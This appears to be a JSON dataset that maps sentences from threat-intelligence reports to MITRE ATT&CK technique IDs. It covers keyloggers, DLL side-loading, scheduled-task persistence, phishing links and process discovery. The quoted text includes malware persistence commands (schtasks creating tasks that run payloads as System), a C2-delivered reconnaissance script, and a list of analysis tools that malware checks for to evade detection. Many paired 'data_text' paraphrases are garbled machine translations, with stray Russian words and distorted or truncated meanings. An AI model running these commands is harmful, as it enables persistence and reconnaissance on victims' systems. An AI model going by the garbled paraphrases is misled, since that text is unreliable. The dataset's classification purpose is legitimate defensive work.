            "en_text": "As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister",
            "data_text": "As mentioned earlier, Buckeye also uses a number of hacking tools, including the following: Keylogger: Keylogger is configured using the command-line options: NetworkService, replace, install, register, and unregister"
        }
    ],
    "The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx": [
        {
            "tec_id": "T1056",
            "en_text": "The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx",
            "data_text": "The keylogger then records keystrokes in encrypted files, such as: thumbcache_96.dbx"
        }
    ],
    "The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs": [
        {
            "tec_id": "T1056",
            "en_text": "The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs",
            "data_text": "Malware initiates its main feature of capturing custom keystrokes and sending them to the management server using standard Windows network APIs"
        }
    ],
    "NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card readers": [
        {
            "tec_id": "T1056",
            "en_text": "NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card readers",
            "data_text": "NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card editors"
        }
    ],
    "Example of decoded keylogger output": [
        {
            "tec_id": "T1056",
            "en_text": "Example of decoded keylogger output",
            "data_text": "Example of a decoded keylogger output"
        }
    ],
    "It is commonly sold on various hacking forums as a keylogger and stealer that can be used to monitor systems and exfiltrate information from those systems": [
        {
            "tec_id": "T1056",
            "en_text": "It is commonly sold on various hacking forums as a keylogger and stealer that can be used to monitor systems and exfiltrate information from those systems",
            "data_text": "It is usually sold at various hacker forums as a keylogger and theft that can be used to monitor systems and filter information from these systems"
        }
    ],
    "Deobfuscated, we can see it is the HawkEye Keylogger — Reborn v9, Version=9.0.1.6": [
        {
            "tec_id": "T1056",
            "en_text": "Deobfuscated, we can see it is the HawkEye Keylogger — Reborn v9, Version=9.0.1.6",
            "data_text": "Deobfuscated, we see that this is HawkEye Keylogger — Reborn v9, Version=9.0.1.6"
        }
    ],
    "8 Upload the TPX498.dat file, which contains the list of collected keystrokes": [
        {
            "tec_id": "T1056",
            "en_text": "8 Upload the TPX498.dat file, which contains the list of collected keystrokes",
            "data_text": "8 Download the TPX498.dat file that contains a list of collected keystrokes"
        }
    ],
    "63 64 ku64.dll ku32.dll Keylogger & clipboard monitor": [
        {
            "tec_id": "T1056",
            "en_text": "63 64 ku64.dll ku32.dll Keylogger & clipboard monitor",
            "data_text": "64 ku64.dll ku32.dll Keylogger"
        }
    ],
    "keylogger) may be missing for these platforms": [
        {
            "tec_id": "T1056",
            "en_text": "keylogger) may be missing for these platforms",
            "data_text": "keylogger) may be missing for these platforms"
        }
    ],
    "However, the campaign that the PDC has recently observed has been delivering this keylogger exclusively": [
        {
            "tec_id": "T1056",
            "en_text": "However, the campaign that the PDC has recently observed has been delivering this keylogger exclusively",
            "data_text": "However, the campaign that the PDC recently observed was the delivery of this keylogger exclusively to the public."
        }
    ],
    "There does appear to be function names however, including PeekMessageA, which has been previously observed in other keylogging malware": [
        {
            "tec_id": "T1056",
            "en_text": "There does appear to be function names however, including PeekMessageA, which has been previously observed in other keylogging malware",
            "data_text": "However, there seem to be feature names including PeekMessageA, which has previously been seen in other malicious program keylogging"
        }
    ],
    "XAgent C2 Communications The macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality": [
        {
            "tec_id": "T1056",
            "en_text": "XAgent C2 Communications The macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality",
            "data_text": "The XAgent C2 Communications MacOS variant XAgent has the ability to receive commands from threat actors through its command and control channel, but is also able to record keystrokes through its keylogger functionality."
        }
    ],
    "Keylogging Functionality XAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them": [
        {
            "tec_id": "T1056",
            "en_text": "Keylogging Functionality XAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them",
            "data_text": "Keylogging The XAgent functionality also has a keylogger function that allows threat actors to steal credentials when a user enters them."
        }
    ],
    "This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes": [
        {
            "tec_id": "T1056",
            "en_text": "This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes",
            "data_text": "This call function will call a function named pressedKeyUsing KeyCode, which is responsible for recording keystrokes"
        }
    ],
    "LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp folder.": [
        {
            "tec_id": "T1056",
            "en_text": "LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp folder.",
            "data_text": "LONGWATCH is a keylogger that issues keystrokes to the log.txt file in the window's temporary folder."
        }
    ],
    "keylog ": [
        {
            "tec_id": "T1056",
            "en_text": "keylog ",
            "data_text": "keylog"
        }
    ],
    " capture keystrokes": [
        {
            "tec_id": "T1056",
            "en_text": " capture keystrokes",
            "data_text": "keystroke capture"
        }
    ],
    "(Source: SecureWorks) Some payloads leveraged DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL": [
        {
            "tec_id": "T1574.002",
            "en_text": "(Source: SecureWorks) Some payloads leveraged DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL",
            "data_text": "(Source: SecureWorks) Some useful party DLL downloads that involve running a legitimate, usually digital, program that downloads a malicious DLL"
        }
    ],
    "Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks   Superficially, we can immediately see the images are quite similar, but with some glaring differences": [
        {
            "tec_id": "T1574.002",
            "en_text": "Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks   Superficially, we can immediately see the images are quite similar, but with some glaring differences",
            "data_text": "Figure 1 On the sides with images of bait within three dollars in October 2017 and January attacks Superficially, we can immediately see images quite similar, but with some bright differences"
        }
    ],
    "The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past": [
        {
            "tec_id": "T1574.002",
            "en_text": "The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past",
            "data_text": "The signed, legitimate, executable malware download technique is commonly referred to as side-loading, and it has witnessed a number of malware campaigns and families in the past."
        }
    ],
    "DLL side loading is often used to maintain persistence on the compromised system": [
        {
            "tec_id": "T1574.002",
            "en_text": "DLL side loading is often used to maintain persistence on the compromised system",
            "data_text": "Side-by-side DLLs are often used to maintain persistence on a compromised system"
        }
    ],
    "DLL side loading has been used to maintain persistence on the compromised system": [
        {
            "tec_id": "T1574.002",
            "en_text": "DLL side loading has been used to maintain persistence on the compromised system",
            "data_text": "DLL boot was used to maintain persistence on the compromised system"
        }
    ],
    "Hunter queried the following URIs in a specific order to determine if the associated software configurations are insecure, and all queries contained the HttpClient User-Agent:  GET /manager/html/ — Tomcat web application manager GET /jmx-console/ — JBoss configuration GET /CFIDE/administrator/login.cfm — ColdFusion configuration  Installation TG-3390 uses DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL": [
        {
            "tec_id": "T1574.002",
            "en_text": "Hunter queried the following URIs in a specific order to determine if the associated software configurations are insecure, and all queries contained the HttpClient User-Agent:  GET /manager/html/ — Tomcat web application manager GET /jmx-console/ — JBoss configuration GET /CFIDE/administrator/login.cfm — ColdFusion configuration  Installation TG-3390 uses DLL side loading, a technique that involves running a legitimate, typically digitally signed, program that loads a malicious DLL",
            "data_text": "Hunter has asked for the next УРИ a certain way, trying to figure out whether related configuration software trust, and all the requests contained user agent HttpClient : GET / manager/html / — The web application Manager GET / jmx-console / — JBoss the configuration GET / CFIDE/administrator/login.cfm — ColdFusion Installation TG-3390 uses DLL-боку, техн.a computer that involves executing a legitimate, usually digital, program that downloads a malicious DLL"
        }
    ],
    "Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of backdoors": [
        {
            "tec_id": "T1574.002",
            "en_text": "Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of backdoors",
            "data_text": "Note: DLL side loading is a common persistence technique that is used to run many backdoors"
        }
    ],
    "As security controls have improved, DLL side loading has evolved to load a payload stored in a different directory or from a registry value": [
        {
            "tec_id": "T1574.002",
            "en_text": "As security controls have improved, DLL side loading has evolved to load a payload stored in a different directory or from a registry value",
            "data_text": "As security control improves, the load side DLL evolved to load the loaded load stored in another directory or from a registry value"
        }
    ],
    "Send exfiltrated data   taskkill.exe Ends working cycle of modules    Persistence Persistence modules are based on scheduled tasks and system registry": [
        {
            "tec_id": "T1053",
            "en_text": "Send exfiltrated data   taskkill.exe Ends working cycle of modules    Persistence Persistence modules are based on scheduled tasks and system registry",
            "data_text": "Sending taskkill.exe exfilter data Completes the Persistence module work cycle based on scheduled tasks and system registry"
        }
    ],
    "For newer operating systems, events.exe creates task.xml as follows:  Then it creates a Windows scheduled task using the following command:       schtasks.exe /create /TN \\\"Events\\\\CacheTask_<user_name_here>\" /XML \\\"<event_cache_dir_path>t /F\"     At the system registry level, modules achieve persistence by adding themselves into the key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit when it finds possible add values to the Winlogon subkey, and in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager": [
        {
            "tec_id": "T1053",
            "en_text": "For newer operating systems, events.exe creates task.xml as follows:  Then it creates a Windows scheduled task using the following command:       schtasks.exe /create /TN \\\"Events\\\\CacheTask_<user_name_here>\" /XML \\\"<event_cache_dir_path>t /F\"     At the system registry level, modules achieve persistence by adding themselves into the key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit when it finds possible add values to the Winlogon subkey, and in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager",
            "data_text": "The new operating systems, событий.exe a task.xml as follows : And then it creates a scheduled task with the schtasks.exe / create / TN \" События\\На system level the roster modules reach, adding the key : HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Винлогон\\Userinit, when he finds the opportunity to add in подключку Winlogon, and in. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager"
        }
    ],
    "In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task": [
        {
            "tec_id": "T1053",
            "en_text": "In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task",
            "data_text": "In addition, the PowerShell implant did not contain a mechanism that could be saved beyond a simple scheduled job."
        }
    ],
    "After execution of every task, the malware sleeps for one minute before executing the next task": [
        {
            "tec_id": "T1053",
            "en_text": "After execution of every task, the malware sleeps for one minute before executing the next task",
            "data_text": "After performing each task, the malware sleeps for one minute before performing the next task."
        }
    ],
    "The main similarities include the use of a scheduled task to persistently execute on the system, as well as the same general process to communicate with its C2 server": [
        {
            "tec_id": "T1053",
            "en_text": "The main similarities include the use of a scheduled task to persistently execute on the system, as well as the same general process to communicate with its C2 server",
            "data_text": "Key similarities include using a scheduled task to persistently perform on the system, as well as the same overall process of communicating with its C2 server."
        }
    ],
    "With the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make sure it runs persistently": [
        {
            "tec_id": "T1053",
            "en_text": "With the Trojan moved its final location, it will then create a scheduled task to run a VBScript to make sure it runs persistently",
            "data_text": "After the Trojan moves to the final location, it will create a scheduled task to run VBScript to ensure that it runs persistently."
        }
    ],
    "The decoded string from the Sch resource is: SchTasks /Create /SC MINUTE /MO 3 /TN “%n%” /TR “wscript %path%” /f The decoded string from the VBS resource is: CreateObject(“WScript.Shell”).Run(“%app%”) The %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin": [
        {
            "tec_id": "T1053",
            "en_text": "The decoded string from the Sch resource is: SchTasks /Create /SC MINUTE /MO 3 /TN “%n%” /TR “wscript %path%” /f The decoded string from the VBS resource is: CreateObject(“WScript.Shell”).Run(“%app%”) The %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin",
            "data_text": "Remote string from Sch Tasks /Create /SC MINUTE /MO 3 /TN \"%n%\" /TR \"wscript %path%\" /f Remote string from VBS resource - CreateObject(\"WScript).Shell\"). Running (\"%app%\") The string %n% in the schtasks command line will be replaced by the GUID saved in GDI.bin"
        }
    ],
    "This differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task": [
        {
            "tec_id": "T1053",
            "en_text": "This differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task",
            "data_text": "This differs from previous OopsIE variants that use a hardcoded task name for a scheduled task"
        }
    ],
    "This process ultimately attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled task as it does not include a main loop to continue its execution": [
        {
            "tec_id": "T1053",
            "en_text": "This process ultimately attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled task as it does not include a main loop to continue its execution",
            "data_text": "This process eventually attempts to run the Trojan every three minutes, which is important as OopsIE relies on this scheduled task as it does not include a basic cycle to continue its execution."
        }
    ],
    "After creating this scheduled task for persistence, the Trojan will begin communicating with its C2 server": [
        {
            "tec_id": "T1053",
            "en_text": "After creating this scheduled task for persistence, the Trojan will begin communicating with its C2 server",
            "data_text": "After creating the scheduled persistence task, the Trojan will start communicating with the C2 server."
        }
    ],
    "A scheduled task is also generated to maintain persistence of the payload": [
        {
            "tec_id": "T1053",
            "en_text": "A scheduled task is also generated to maintain persistence of the payload",
            "data_text": "A scheduled task is also generated to maintain payload persistence"
        }
    ],
    "Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host": [
        {
            "tec_id": "T1053",
            "en_text": "Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host",
            "data_text": "Office365DCOMCheck or SystemDiskClean) as the name of the scheduled task to maintain persistence on the victim node"
        }
    ],
    "The malware component, test.exe, uses the Windows command \"cmd.exe\" /C whoami” to verify it is running with the elevated privileges of “System” and creates persistence by creating the following scheduled task:     schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON     /ru \"System\" When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913": [
        {
            "tec_id": "T1053",
            "en_text": "The malware component, test.exe, uses the Windows command \"cmd.exe\" /C whoami” to verify it is running with the elevated privileges of “System” and creates persistence by creating the following scheduled task:     schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON     /ru \"System\" When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913",
            "data_text": "The malware test.exe use Windows \"cmd.exe\" / C whoami for checking its work with elevated privileges \"System\" and perseverance through the development of the next planned tasks : schtasks / create / tn \"mysc\" / o C:При the implementation of the malicious software first is SOCKS5 connection with 192.157.198.103 using TCP port."
        }
    ],
    "The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems": [
        {
            "tec_id": "T1053",
            "en_text": "The malware also contains an embedded .NET wrapper DLL for creating and managing scheduled tasks on Windows systems",
            "data_text": "Malware also contains a built-in .NET wrapper DLL to create and manage scheduled tasks on Windows systems"
        }
    ],
    "This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot": [
        {
            "tec_id": "T1053",
            "en_text": "This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot",
            "data_text": "DLL is used to create a scheduled task pointing to QuasarRAT binary, microsoft_network.exe, which allows it to remain persistent after a reboot"
        }
    ],
    "They use At.exe to schedule tasks to run self-extracting RAR archives, which install either HttpBrowser or PlugX": [
        {
            "tec_id": "T1053",
            "en_text": "They use At.exe to schedule tasks to run self-extracting RAR archives, which install either HttpBrowser or PlugX",
            "data_text": "They use At.exe to schedule tasks to run RAR self-extracting archives that install either HttpBrowser or PlugX."
        }
    ],
    "Another batch script run by a scheduled task renames the archives on the file server (see Figure 15)": [
        {
            "tec_id": "T1053",
            "en_text": "Another batch script run by a scheduled task renames the archives on the file server (see Figure 15)",
            "data_text": "Another batch script running the scheduled task renames the archives on the file server (see Figure ). 15)"
        }
    ],
    "The scripts create scheduled tasks and also retrieve, decode, and execute a copy of Revenge RAT": [
        {
            "tec_id": "T1053",
            "en_text": "The scripts create scheduled tasks and also retrieve, decode, and execute a copy of Revenge RAT",
            "data_text": "Scripts create scheduled tasks, and receive, decrypt, and execute a copy of the RATA payback."
        }
    ],
    "Figure 1: Code from 29[.]html scheduling the first task to run a script from pastebin The second task (“MSOFFICEER”) in Figure 2 runs the script contents of a different page of the same blog, blog-page[.]html, every 100 minutes": [
        {
            "tec_id": "T1053",
            "en_text": "Figure 1: Code from 29[.]html scheduling the first task to run a script from pastebin The second task (“MSOFFICEER”) in Figure 2 runs the script contents of a different page of the same blog, blog-page[.]html, every 100 minutes",
            "data_text": "Figure 1: Code of 29[.]html, which plans the first task to run the script from the pastebin The second task (\"MSOFFICEER\") in Figure 2 runs the script contents of another page of the same blog, the blog page[.]html, every 100 minutes"
        }
    ],
    "The spreadsheet also creates a scheduled task named \"windows update check\" that runs the file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute.": [
        {
            "tec_id": "T1053",
            "en_text": "The spreadsheet also creates a scheduled task named \"windows update check\" that runs the file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute.",
            "data_text": "The table also creates a scheduled task called \"Windows update check\" that runs the C:\\User_Name\\ file.templates\\System Manager.exe every minute."
        }
    ],
    "When the trojan starts up it will attempt to install a scheduled task with the name of “Java Maintenance64” to keep itself running.": [
        {
            "tec_id": "T1053",
            "en_text": "When the trojan starts up it will attempt to install a scheduled task with the name of “Java Maintenance64” to keep itself running.",
            "data_text": "When the trojan runs, it will attempt to set a scheduled task named \"Java Maintenance64\" to keep itself in operation."
        }
    ],
    "The campaigns maintain persistence on machines by creating two daily scheduled task entries.": [
        {
            "tec_id": "T1053",
            "en_text": "The campaigns maintain persistence on machines by creating two daily scheduled task entries.",
            "data_text": "The campaign maintains persistence on machines by creating two daily scheduled jobs."
        }
    ],
    "The script writes files to the path % appdata %\\Roaming\\Microsoft\\Templates\\, then creates two task entries triggered to run daily.": [
        {
            "tec_id": "T1053",
            "en_text": "The script writes files to the path % appdata %\\Roaming\\Microsoft\\Templates\\, then creates two task entries triggered to run daily.",
            "data_text": "The script writes the files to the % appdata %\\Roaming\\Microsoft\\Styles\\ path, then creates two task runs that run daily."
        }
    ],
    " scheduled task": [
        {
            "tec_id": "T1053",
            "en_text": " scheduled task",
            "data_text": "planned task"
        }
    ],
    "sch.exe": [],
    "Cyber threat groups’ access to the media organization’s networks could potentially provide the government advance warning on upcoming protests, information on pro-democracy group leaders, and insights needed to disrupt activity on the Internet, such as what occurred in mid-2014 when several websites were brought down in denial of service attacks.[8] Threat Actors Use Spear Phishing Written in Traditional Chinese Script in Attempted Intrusions In August 2015, the threat actors sent spear phishing emails to a number of Hong Kong-based media organizations, including newspapers, radio, and television": [],
    "On occasions, the phishing emails contained links to external domains to download the first stage, and sometimes the first stage was attached to the email itself": [
        {
            "tec_id": "T1566.002",
            "en_text": "On occasions, the phishing emails contained links to external domains to download the first stage, and sometimes the first stage was attached to the email itself",
            "data_text": "Sometimes phishing emails contained links to external domains to download the first stage, and sometimes the first stage was attached to the email itself."
        }
    ],
    "These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files": [
        {
            "tec_id": "T1566.002",
            "en_text": "These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files",
            "data_text": "These letters included themed dialing techniques and links to malicious HTML application files (.hta)"
        }
    ],
    "The first link was labeled as \"Comparison of Major Tasks in '16 & '17\" and the second link was identified as \"Comparison between '16 & '17\".Upon opening these links the user was presented with a further decoy Hangul document": [
        {
            "tec_id": "T1566.002",
            "en_text": "The first link was labeled as \"Comparison of Major Tasks in '16 & '17\" and the second link was identified as \"Comparison between '16 & '17\".Upon opening these links the user was presented with a further decoy Hangul document",
            "data_text": "The first link was placed as \"Comparison of major tasks in '16"
        }
    ],
    "It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism": [
        {
            "tec_id": "T1566.002",
            "en_text": "It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism",
            "data_text": "As a delivery mechanism, it is likely that the opponent used spear-picking attacks containing links to these malicious documents."
        }
    ],
    "Group123 Links?  As we explore the Korean malware landscape, we always have burning questions relating to any possible links with Group123": [
        {
            "tec_id": "T1566.002",
            "en_text": "Group123 Links?  As we explore the Korean malware landscape, we always have burning questions relating to any possible links with Group123",
            "data_text": "Group123 Links? As we study the Korean landscape of malware, we always have hot questions related to any possible links to Group123"
        }
    ],
    "It’s important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks these links (including researchers) are also counted": [
        {
            "tec_id": "T1566.002",
            "en_text": "It’s important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks these links (including researchers) are also counted",
            "data_text": "It is important to remember that when we used Bitly links to determine the location of the click, everyone who clicks on those links (including explorers) is also counted"
        }
    ],
    "email with an embedded tracking link": [
        {
            "tec_id": "T1566.002",
            "en_text": "email with an embedded tracking link",
            "data_text": "email with built-in tracking link"
        }
    ],
    "A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk": [
        {
            "tec_id": "T1027.001",
            "en_text": "A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk",
            "data_text": "This copied file is enclosed with 64 MB of garbage, probably as a way to contain any security products that can be scanned by files on disk."
        }
    ],
    "Using this example, Comnie will then request data to supply to the BAT script, via the following decrypted request: h=HOSTNAME-PC&f=gethostinfo.bat&c=& Based on network traffic witnessed, the remote C2 server was found to respond with the following information:       netstat -ano > %TEMP%\\info.datipconfig /all >> %TEMP%\\info.datroute PRINT >> %TEMP%\\info.datnet view >> %TEMP%\\info.dattasklist >> %TEMP%\\info.datnet user >> %TEMP%\\info.datnet start >> %TEMP%\\info.dat       This script is written to a temporary file prior to be executed": [],
    "tasklist /svc ": [
        {
            "tec_id": "T1007",
            "en_text": "tasklist /svc ",
            "data_text": "task list /svc"
        }
    ],
    " sc query": [
        {
            "tec_id": "T1007",
            "en_text": " sc query",
            "data_text": "sk-request"
        }
    ],
    "The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden": [
        {
            "tec_id": "T1564.001",
            "en_text": "The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden",
            "data_text": "In the latter part of the VBA script, the properties of these two files are changed by setting their attributes to hidden."
        }
    ],
    "The locations:  For root user  path: /Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/ processname: screenassistantd  For regular user  path: ~/Library/Spelling/ processname: spellagentd Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file": [
        {
            "tec_id": "T1564.001",
            "en_text": "The locations:  For root user  path: /Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/ processname: screenassistantd  For regular user  path: ~/Library/Spelling/ processname: spellagentd Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file",
            "data_text": "Location For root userIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/Process name: screen assistant for regular user: ~/Library/Process name: spellagentd Subsequently, it implements the Loader::installLoader method, reading hardcoded Mach-O executable (magic value 0xFEEDFACF), and recording the previously defined file."
        }
    ],
    "At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\\ProgramData\\Apple\\Update\\, likely as a ruse": [
        {
            "tec_id": "T1564.001",
            "en_text": "At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\\ProgramData\\Apple\\Update\\, likely as a ruse",
            "data_text": "When installed, the MSI file deletes three files and creates one hidden directory (Ufile) in C:\\ProgramData\\Apple\\Update\\, probably as a schema"
        }
    ],
    "This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4": [
        {
            "tec_id": "T1057",
            "en_text": "This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4",
            "data_text": "This field contains the URL to be used by the trojan to download the <process ID Trojan>.txt file that will be structured as <process ID Trojan> content.<C2 domain> where the process ID is encoded with the same character replacement function as previously shown in Table 4."
        }
    ],
    "The oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6…) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place": [
        {
            "tec_id": "T1057",
            "en_text": "The oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6…) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place",
            "data_text": "The oldest known Delphi variant sample (SHA256: 5a02d4e5f6…) provided us with a stronger connection between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the startup path attached to the Start location line"
        }
    ],
    "The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes": [
        {
            "tec_id": "T1057",
            "en_text": "The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes",
            "data_text": "The most noticeable change of this variant of Zebrocy, in addition to the programming language used, is the way of collecting system information and running processes."
        }
    ],
    "Gather domain and account names based on all running processes  Gathering account information from running processes": [
        {
            "tec_id": "T1057",
            "en_text": "Gather domain and account names based on all running processes  Gathering account information from running processes",
            "data_text": "Collect domain and account names based on all running processes Collect account information from running processes"
        }
    ],
    "Visitors are asked to download the “University Of Oxford Job Symposium Pre-Register Tool”:  The downloaded file (which is also signed with an AI Squared certificate), is a fake registration tool built by the attackers: OxfordSymposiumRegTool.exe f77ee804de304f7c3ea6b87824684b33 If run by the victim, their computer would get infected, while they are shown this registration process:    Note that after completing the “registration process”, the victim is asked to send the form to an email address in oxford-careers[.]com, which also belongs to the attackers": [],
    "Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it": [
        {
            "tec_id": "T1057",
            "en_text": "Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it",
            "data_text": "Figure 2 : Цепочка the process for the first part of the campaign, though the actual of VBS script has changed from sample to the pattern with the various levels обдуманности and a variety of ways призова to the next phase of the process, its ultimate goal remained the same : upon your PowerShell encode the PowerShell engine in basic file, which was droпэп the макросом, and performing it."
        }
    ],
    "Verifies that there is no process with the name “rsyncd” on the active process list (“dbus-inotifier” if the Trojan does not have root privileges)": [
        {
            "tec_id": "T1057",
            "en_text": "Verifies that there is no process with the name “rsyncd” on the active process list (“dbus-inotifier” if the Trojan does not have root privileges)",
            "data_text": "Verifies that there is no process named \"rsyncd\" in the list of active processes (\"dbus-inotifier\" if the Trojan does not have root privileges)"
        }
    ],
    "It searches the active process list for the systemd process": [
        {
            "tec_id": "T1057",
            "en_text": "It searches the active process list for the systemd process",
            "data_text": "It searches the active list of systemd processes"
        }
    ],
    "Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted": [
        {
            "tec_id": "T1057",
            "en_text": "Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted",
            "data_text": "It then checks the running processes based on a list of hardcoded process names; if they are detected, the machine reboots."
        }
    ],
    "“win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”idaq“,”idaq64“,”ImmunityDebugger“,”Wireshark“,”dumpcap“,”HookExplorer“,”ImportREC“,”PETools“,”LordPE“,”dumpcap“,”SysInspector“,”proc_analyzer“,”sysAnalyzer“,”sniff_hit“,”windbg“,”joeboxcontrol“,”joeboxserver“  Blacklisted process names in the malware In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll “NtRaiseHardError” function": [
        {
            "tec_id": "T1057",
            "en_text": "“win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”idaq“,”idaq64“,”ImmunityDebugger“,”Wireshark“,”dumpcap“,”HookExplorer“,”ImportREC“,”PETools“,”LordPE“,”dumpcap“,”SysInspector“,”proc_analyzer“,”sysAnalyzer“,”sniff_hit“,”windbg“,”joeboxcontrol“,”joeboxserver“  Blacklisted process names in the malware In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll “NtRaiseHardError” function",
            "data_text": "\"win32_remote\"\",\" win64_remote64 \"\", ollydbg\",\"ПроцессHacker \"\", \"tcpview\"\",\" autoruns \"\", \"autorunsc\"\",\" filemon \"\", \"procmon\"\",\" regmon \"\", \"procxp\"\", idaq\"\",\" ImunityDebugger \"\", \"Wireshark\"\",\" dumpcap \", HookExplorer \", ImportREC \", PEtools \", LordPE \", dumpcap \", SysInspector \", proc_analyzer \", sysAnalyzer \", sniff_hit \", windbg \", joeboxcontrol \", joeboxserver\"Черные the names in the development of malicious programs In some places, withif it works through a calculator.iseHardError\" function"
        }
    ],
